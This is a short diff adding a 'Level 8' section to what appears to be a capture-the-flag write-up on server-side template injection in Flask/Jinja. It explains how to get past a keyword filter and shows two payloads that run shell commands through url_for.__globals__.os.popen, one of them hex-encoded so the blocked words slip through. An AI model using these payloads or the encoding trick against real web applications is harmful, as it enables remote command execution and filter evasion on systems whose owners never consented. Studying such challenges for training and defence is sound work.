@@ -134,3 +134,17 @@
 
 
 ```
+
+### Level 8
+* This doesn't allow us to include "class", "base",  "globals", or "popen"
+	* Thus, we can just convert everything to hex like we did before
+
+* Here is the original payload along with all the characters converted to hex:
+```python3
+
+{{ url_for.__globals__.os.popen('cat flag').read() }}
+
+{{ url_for["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"].os["\x70\x6f\x70\x65\x6e"]('cat flag').read() }}
+
+
+```
